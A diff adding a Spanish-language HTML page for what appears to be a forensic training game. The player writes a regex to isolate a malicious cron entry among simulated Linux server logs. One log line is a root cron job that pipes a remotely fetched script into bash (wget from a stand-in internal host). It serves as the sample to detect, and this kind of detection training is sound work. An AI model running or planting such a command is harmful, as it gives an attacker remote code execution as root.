@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Análisis Forense - CASE-2026-NEKROS</title>
+    <link rel="stylesheet" href="css/estilos.css?v=4.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* Estilos específicos inyectados para la terminal de Regex */
+        .contenedor-regex {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            padding: 20px;
+            height: calc(100vh - 70px);
+            background-color: var(--color-void);
+        }
+        .consola-logs {
+            flex-grow: 1;
+            background-color: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 15px;
+            overflow-y: auto;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.9rem;
+            color: #888;
+            line-height: 1.6;
+        }
+        .comando-linea { border-left: 3px solid transparent; padding-left: 10px; margin-bottom: 5px; }
+        .comando-linea.highlight { border-left-color: #ff9100; color: #fff; background-color: rgba(255, 145, 0, 0.1); }
+        .comando-linea.objetivo-cazado { border-left-color: var(--color-cyan); color: var(--color-cyan); background-color: rgba(0, 229, 255, 0.1); font-weight: bold; }
+        
+        .panel-filtro {
+            background-color: var(--color-panel);
+            padding: 20px;
+            border: 1px solid #222;
+            border-radius: 4px;
+        }
+        .input-regex {
+            width: 100%;
+            background-color: #000;
+            border: 1px solid var(--color-cyan);
+            color: var(--color-cyan);
+            padding: 12px;
+            font-family: var(--font-terminal);
+            font-size: 1.1rem;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            outline: none;
+            box-shadow: inset 0 0 10px rgba(0, 229, 255, 0.1);
+        }
+        .input-regex:focus { box-shadow: inset 0 0 15px rgba(0, 229, 255, 0.3), 0 0 10px rgba(0, 229, 255, 0.2); }
+    </style>
+</head>
+<body class="body-autopsia">
+
+    <nav class="topbar-tactica">
+        <div class="nav-links">
+            <a href="expedientes.html"><i class="fas fa-arrow-left"></i> Abortar y Volver a Expedientes</a>
+        </div>
+        <div class="nav-auth" style="color: #ff9100; font-family: var(--font-terminal);">
+            <span>EXPEDIENTE: CASE-2026-NEKROS // ESTADO: EN CURSO</span>
+        </div>
+    </nav>
+
+    <main class="contenedor-regex">
+        
+        <div class="panel-filtro">
+            <h3 style="color: var(--color-cyan); font-family: var(--font-terminal); margin-bottom: 10px; font-size: 1rem;">
+                <i class="fas fa-terminal"></i> MOTOR DE FILTRADO ALGÓRITMICO (REGEX)
+            </h3>
+            <p style="color: var(--color-ash); font-size: 0.85rem; margin-bottom: 15px;">
+                Identifica el cronjob malicioso (descarga externa ejecutada por root). Inyecta el patrón para aislar la anomalía.
+            </p>
+            <input type="text" id="input-regex" class="input-regex" placeholder="Ej: /root.*wget/ig" autocomplete="off" spellcheck="false">
+            
+            <div class="formulario-tactico">
+                <button id="btn-volcado" disabled style="width: 100%; opacity: 0.3; cursor: not-allowed; border-color: #ff9100; color: #ff9100;">INICIAR VOLCADO DE MEMORIA RAM</button>
+            </div>
+        </div>
+
+        <div class="consola-logs" id="visor-logs">
+            </div>
+
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const visorLogs = document.getElementById('visor-logs');
+            const inputRegex = document.getElementById('input-regex');
+            const btnVolcado = document.getElementById('btn-volcado');
+
+            // Ruido blanco: Logs simulados de un servidor Linux. Solo uno es el ataque.
+            const dumpLogs = [
+                "May 16 02:45:01 bsa-talaia sshd[8412]: Accepted publickey for admin from 192.168.1.50 port 50112 ssh2",
+                "May 16 02:47:15 bsa-talaia CRON[8501]: (root) CMD ( /usr/local/bin/system_check.sh > /dev/null 2>&1 )",
+                "May 16 02:50:00 bsa-talaia kernel: [12345.6789] UFW BLOCK IN=eth0 OUT= MAC=00:1A:2B SRC=45.33.22.11 DST=10.0.0.5",
+                "May 16 02:55:01 bsa-talaia CRON[8602]: (admin) CMD ( /home/admin/backup_db.sh )",
+                "May 16 03:00:01 bsa-talaia CRON[8902]: (root) CMD ( wget -qO- http://10.66.0.99/nekros.sh | bash )", // LA ANOMALÍA
+                "May 16 03:05:12 bsa-talaia sshd[9011]: Disconnected from user admin 192.168.1.50 port 50112",
+                "May 16 03:10:00 bsa-talaia CRON[9100]: (root) CMD ( /etc/webmin/cron/temp.pl )",
+                "May 16 03:15:33 bsa-talaia sudo: pam_unix(sudo:session): session opened for user root by (uid=0)"
+            ];
+
+            // Renderizado inicial
+            function renderizarLogs(patronRegex = null) {
+                visorLogs.innerHTML = '';
+                let anomaliaAislada = false;
+
+                dumpLogs.forEach(log => {
+                    let div = document.createElement('div');
+                    div.className = 'comando-linea';
+                    
+                    if (patronRegex && log.match(patronRegex)) {
+                        // Si el log incluye la palabra clave del malware y el regex la caza, es un éxito
+                        if (log.includes('nekros.sh')) {
+                            div.className += ' objetivo-cazado';
+                            div.innerHTML = log + " <strong>// [!] PAYLOAD DETECTADO</strong>";
+                            anomaliaAislada = true;
+                        } else {
+                            // Si caza un log inocente
+                            div.className += ' highlight';
+                            div.textContent = log;
+                        }
+                    } else {
+                        div.textContent = log;
+                    }
+                    visorLogs.appendChild(div);
+                });
+
+                // Lógica del semáforo del botón
+                if (anomaliaAislada) {
+                    btnVolcado.disabled = false;
+                    btnVolcado.style.opacity = '1';
+                    btnVolcado.style.cursor = 'pointer';
+                    btnVolcado.style.backgroundColor = '#ff9100';
+                    btnVolcado.style.color = '#000';
+                    btnVolcado.style.boxShadow = '0 0 15px rgba(255, 145, 0, 0.6)';
+                    btnVolcado.textContent = 'EJECUTAR VOLCADO DE MEMORIA RAM';
+                } else {
+                    btnVolcado.disabled = true;
+                    btnVolcado.style.opacity = '0.3';
+                    btnVolcado.style.cursor = 'not-allowed';
+                    btnVolcado.style.backgroundColor = 'transparent';
+                    btnVolcado.style.color = '#ff9100';
+                    btnVolcado.style.boxShadow = 'none';
+                    btnVolcado.textContent = 'INICIAR VOLCADO DE MEMORIA RAM';
+                }
+            }
+
+            renderizarLogs();
+
+            // Escuchar el teclado del agente en tiempo real
+            inputRegex.addEventListener('input', (e) => {
+                let valor = e.target.value;
+                if (valor.length === 0) {
+                    renderizarLogs();
+                    return;
+                }
+
+                try {
+                    // Creamos el motor de búsqueda Regex sin que se cuelgue si el usuario escribe mal
+                    let regex = new RegExp(valor, 'i'); 
+                    renderizarLogs(regex);
+                } catch (err) {
+                    // Si la sintaxis Regex está incompleta (ej: dejar un corchete abierto), ignoramos
+                }
+            });
+
+            // Acción final
+            btnVolcado.addEventListener('click', () => {
+                alert('>>> INICIANDO VOLCADO RAW DE LA MEMORIA...\n[+] Evidencia adquirida.\n[+] Actualizando estado del incidente en la base de datos...\n\nSISTEMA COMPROMETIDO ESTABILIZADO EN MODO FORENSE.');
+                window.location.href = 'expedientes.html';
+            });
+        });
+    </script>
+</body>
+</html>
